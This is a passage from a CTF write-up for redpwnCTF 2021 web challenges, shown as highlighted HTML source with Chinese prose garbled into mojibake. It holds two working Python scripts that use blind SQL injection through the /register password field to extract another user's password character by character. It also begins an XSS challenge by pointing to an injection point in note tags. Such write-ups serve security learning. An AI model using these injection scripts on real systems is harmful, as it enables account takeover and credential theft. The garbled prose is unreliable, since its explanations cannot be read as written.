&lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;register&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">})&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">})&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#34;Incorrect&amp;#34;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">val&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">c&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">val&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Ê≥®ÂÖ•ÁÇπ‰ªçÁÑ∂ÊòØ‰∏äÊñáÊèêÂà∞ÁöÑ&lt;code>/register&lt;/code>Ë∑ØÁî±‰∏≠&lt;code>create_user(username,password)&lt;/code>ÔºàÂΩìÊó∂ÊâæÂØπ‰∫ÜÊ≥®ÂÖ•ÁÇπÔºå‰ΩÜÊòØÁõ≤Ê≥®ËøôÂùóËøòÊòØÂÅöÁöÑÂ∞ëÔºâ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806085327316.png" alt="image-20210806085327316">&lt;/p>
&lt;p>‰∏ªË¶ÅÁöÑpayloadÊòØ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;||(select substr(password,&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">,1) from users)||&amp;#39;&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Ëøô‰∏ÄÂè•ÔºåÂΩìËøõÂÖ•Âà∞Ê≥®ÂÜåÊµÅÁ®ãÊó∂ ‰ºöÊâßË°å&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">excute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;INSERT INTO users (username, password)&amp;#39;&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;VALUES (&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">, &lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">);&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Âç≥&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">excute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;INSERT INTO users(username, password)&amp;#39;&lt;/span> &lt;span style="color:#111">values&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;xxxxusernamexxxx&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">||&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">select&lt;/span> &lt;span style="color:#111">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">users&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">||&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÂÖ∂‰∏≠&lt;code>||&lt;/code>ËøûÊé•‰∏§‰∏™‰∏çÂêåÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÂæóÂà∞‰∏Ä‰∏™Êñ∞ÁöÑÂ≠óÁ¨¶‰∏≤ÔºõÊâÄ‰ª•ÂèëÈÄÅÊ≥®ÂÜåËØ∑Ê±ÇÊó∂passwordÁöÑÂÄºÂ∞±ÊòØÂêéÈù¢ÁöÑÊü•ËØ¢ËØ≠Âè•&lt;code>select substr(password,n,1) from users&lt;/code>ÔºåËÄåÊü•ËØ¢ËØ≠Âè•ËøîÂõûÁöÑÊòØ&lt;code>substr(password,n,1)&lt;/code> ÊòØginkoidËøô‰∏™Ë¥¶Êà∑ÁöÑÂØÜÁ†ÅÁöÑÂÖ∂‰∏≠‰∏Ä‰ΩçÔºåË¶ÅËé∑ÂæóËøô‰∏™ÂÄºÂÖ∑‰ΩìÊòØ‰ªÄ‰πà ÈúÄË¶ÅÂÜçÊúâ‰∏Ä‰∏™&lt;code>for in _ in charset&lt;/code>ÈÅçÂéÜÔºåÂú®ÁôªÂΩïÂ§Ñ ÊääËøô‰∏™ÂÄºÁªôËØïÂá∫Êù•&lt;/p>
&lt;p>&lt;a href="https://github.com/Muirey03/redpwn2021_writeups/blob/master/web_cool.md">Ëã±ÊñáÁâàËÆ≤Ëß£&lt;/a>Ôºö&lt;em>The SELECT statement will take the character at index in ginkoid&amp;rsquo;s password, and concatenate it with &amp;lsquo;&amp;rsquo;, to be used as the new user&amp;rsquo;s password. We can then try logging in as our new user with every character in allowed_characters as the password. If we login successfully, then we know that we guessed the character correctly. Repeating this for all 32 characters gives us our password.&lt;/em>&lt;/p>
&lt;p>Ëé∑ÂæóÂØÜÁ†ÅÂêé‰ª•ginkoidÁöÑË¥¶Âè∑ÁôªÂΩïÔºå‰ºöÂæóÂà∞‰∏Ä‰∏™mp3Êñá‰ª∂Ôºå‰ΩÜÊòØÂπ∂‰∏çÊòØ‰ªÄ‰πàÊâÄË∞ìÁöÑÈöêÂÜô flagÂ∞±Âú®ÊäìÂåÖÂêéÂèØ‰ª•ÁúãÂà∞&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210713164749339.png" alt="image-20210713164749339">&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîÂÖ∂ÂÆûËøòÊòØÊúâ‰∏ÄÁÇπÁÇπÁñëÈóÆÔºå‰∏∫‰ªÄ‰πà&lt;code>select substr(password,n,1) from users&lt;/code>Â∞±ËÉΩÁ°Æ‰øùÊòØginoidÁöÑpasswdÂë¢ÔºüginkoidÊòØË°®‰∏≠ÁöÑÁ¨¨‰∏ÄÊù°Êï∞ÊçÆÔºåÂú®Êñ∞Âª∫Ë°®ÂêéÁ´ãÂàªÊèíÂÖ•ÔºåËøôÂ∞±ÂèØ‰ª•‰øùËØÅÂú®Êü•ËØ¢ÁöÑÊó∂ÂÄôÂè™Êü•ginkoidÁöÑÂØÜÁ†ÅÂêóÔºü&lt;/p>
&lt;p>discord‰πãÂâçÊúâ‰∫∫ÈóÆËøáËøô‰∏™ÈóÆÈ¢òÔºåÂΩìÊó∂ÁöÑËß£Á≠îÊòØËøôÊòØsqlliteÁöÑÁâπÊÄßÔºå‰ΩÜÊòØÁî®sqlliteÂú®Á∫øÂ∑•ÂÖ∑Â∞ùËØïÂêéÂèëÁé∞‰πü‰∏çÊòØËøôÊ†∑ÁöÑ ‰πü‰ºöËøîÂõûÊâÄÊúâÊï∞ÊçÆÁöÑ&lt;code>substr(x,x,x)&lt;/code>ÁöÑÂÄºÔºå‰ΩÜÊòØÁ°ÆÂÆûÊòØÁî®ËøôÊ†∑ÁöÑpayloadËÉΩÂÅöÂá∫Êù•&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210713164423092.png" alt="image-20210713164423092">&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîÂêéÊù•ÊÉ≥‰∫Ü‰∏Ä‰∏ã ÊòØËøôÈáåÁöÑ&lt;code>return correct_password[0][0]==password&lt;/code> Á°Æ‰øù‰∫ÜËôΩÁÑ∂sqlÊü•ËØ¢ËØ≠Âè•ËøîÂõûÁöÑÊòØÂæàÂ§ö‰∏™Âçï‰∏ÄÂ≠óÊØçÔºå‰ΩÜÊòØÊòØÂ§öË°åËøîÂõûÔºå‰ªçÁÑ∂Âè™‰ºöÂèñÂà∞Á¨¨‰∏Ä‰∏™ÔºõÂÜçÂä†‰∏äusernameÊòØ‰∏ªÈîÆ Á¨¨‰∏Ä‰∏™ÊèíÂÖ•ÔºåÊâÄ‰ª•Ëøô‰∏™payloadÊòØÂèØ‰ª•ÁöÑ&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716173434141.png" alt="image-20210716173434141">&lt;/p>
&lt;p>‰ª•‰∏Ä‰∏™‰∫ãÂêéËØ∏Ëëõ‰∫ÆÁöÑËßíÂ∫¶Êù•Áúã&lt;code>return correct_password[0][0]==password&lt;/code> ËøôÂè•‰ª£Á†Å ÂÖ∂ÂÆûÊúâÊöóÁ§∫ÁöÑÊàêÂàÜÂú®‰∫Ü&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîËøòÊúâÂè¶‰∏ÄÁâàÁöÑËÑöÊú¨ discordÈáåÊî∂ÁöÑ&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716175415526.png" alt="image-20210716175415526.png">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">asyncio&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">aiohttp&lt;/span>
&lt;span style="color:#111">allowed&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789&amp;#39;&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;https://cool.mc.ax/&amp;gt;&amp;#39;&lt;/span>
&lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>
&lt;span style="color:#111">final&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">try_pass&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sem&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">sem&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">aiohttp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ClientSession&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#39;Incorrect&amp;#39;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;password[&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">]: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">final&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">password&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">get_char&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sem&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#75715e"># random username since otherwise we error&lt;/span>
&lt;span style="color:#111">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">choices&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">allowed&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">k&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;||(SELECT substr(password,&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">,1) FROM users)||&amp;#39;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">50&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">sem&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">aiohttp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ClientSession&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;register&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">tasks&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[]&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">allowed&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">tasks&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">try_pass&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sem&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#111">asyncio&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">gather&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">tasks&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#75715e"># without this we get an OSError due to too many open file descriptors&lt;/span>
&lt;span style="color:#111">sem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">asyncio&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Semaphore&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">300&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">index_tasks&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[]&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">index_tasks&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">get_char&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sem&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#111">asyncio&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">gather&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">index_tasks&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">final&lt;/span>&lt;span style="color:#111">)):&lt;/span>
&lt;span style="color:#111">password&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">final&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;Password: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">asyncio&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="webnotes">web/notes&lt;/h2>
&lt;blockquote>
&lt;p>Texting things to yourself, but online! &lt;a href="https://notes.mc.ax/">notes.mc.ax&lt;/a>&lt;/p>
&lt;p>&lt;em>Please put a reasonably secure password when making an account&lt;/em>&lt;/p>
&lt;p>Report problems &lt;a href="https://admin-bot.mc.ax/notes">here&lt;/a>.&lt;/p>
&lt;p>Downloads - &lt;a href="https://static.redpwn.net/uploads/b84015269379e24fc336a02b23656a1428e8bea965667738ede86e3c8e611ca1/notes.tar.gz">notes.tar.gz&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>ÂÖàÁúãÈ°µÈù¢ ÊòØ‰∏™ÁôªÂΩïÊ°ÜÔºåÂÖàÂ°´Áî®Êà∑ÂêçÂíåÂØÜÁ†ÅÂÜçÁÇπloginÊàñregisterÔºåÂ∞ùËØïtest: testÁôªÂÖ•ÔºåÁïåÈù¢ÊòØ‰∏Ä‰∏™ÂèØ‰ª•Âä†notes Ëá™ÂÆöbodyÂíåtagÁöÑapp&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710144224462.png" alt="image-20210710144224462">&lt;/p>
&lt;p>Âú®view notesÁúãÂà∞Â∑≤ÁªèÊúâ‰∫∫ËØïËøáxss‰∫ÜÔºåËøôÈáåÊúâ‰∏™Â∞èÂ∞èÁöÑË∂äÊùÉÊºèÊ¥ûÔºå/view/+usernameÁõ¥Êé•ÂèØ‰ª•ÁúãÂà∞ÂÖ∂‰ªñÁöÑÂ∏àÂÇÖÂú®Â∞ùËØï‰ªÄ‰πàÊ†∑ÁöÑpayloadÔºàÁúã‰∫Üwp‰ª•ÂêéÊâçÊÑèËØÜÂà∞ËøôÈáåÁöÑtagÈÉ®ÂàÜÂ∞±ÊòØÊ≥®ÂÖ•ÁÇπ ËÄåÂΩìÊó∂ÁöÑÊàë‰ª•‰∏∫ÊòØÂç°bug‰∫Ü&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710195356571.png" alt="image-20210710195356571">&lt;/p>
&lt;p>ÁÆÄÂçïÂÆ°‰∫Ü‰∏ãÊ∫êÁ†ÅÔºå‰πüÊ≤°Âï•ÁâπÂà´ÁöÑÔºåÈ¶ñÂÖàÂàùÂßãÂåñ‰∏Ä‰∏™adminÂè∑ÔºåflagÂú®adminÁöÑprivateÂàÜÁ±ªÁöÑnotes‰∏≠ÔºõÂØπ‰∫é‰∏™‰∫∫ÂèëÁöÑnotes‰ºöËΩ¨‰πâbodyÈÉ®ÂàÜ‰∏∫htmlÂÆû‰ΩìÊù•È¢ÑÈò≤xss&lt;/p>
&lt;p>‰ΩÜÊòØËøô‰∏™notes-appÁöÑÂΩ¢ÂºèÊòØÂ¶•Â¶•ÁöÑxss‰∫ÜÔºåÈÇ£Á™ÅÁ†¥Âè£Âú®Âì™ÈáåÊçèÔºüÂÖ∂ÂÆûÊòØË¢´ÂøΩÁï•ÁöÑtagÈÉ®ÂàÜÔºÅ‰∏ÄËà¨ÊÉÖÂÜµ‰∏ãÁúãÂà∞tagÂèØÈÄâprivate/publicÂ∞±‰ºö‰∏çÂÖ≥Ê≥®ËøôÈáåÔºå‰ΩÜÊòØÈÖçÂêàÁâπÊÆäÁöÑDOMËß£Êûê ËøôÈáåÊó†ÁñëÊòØÊ≥®ÂÖ•ÁÇπÔºÅ‰∏ãÈù¢ÁÆÄÂçïÂàÜÊûê‰∏Ä‰∏ãÔºå&lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#notes">ÂèÇËÄÉwp&lt;/a>&lt;/p>
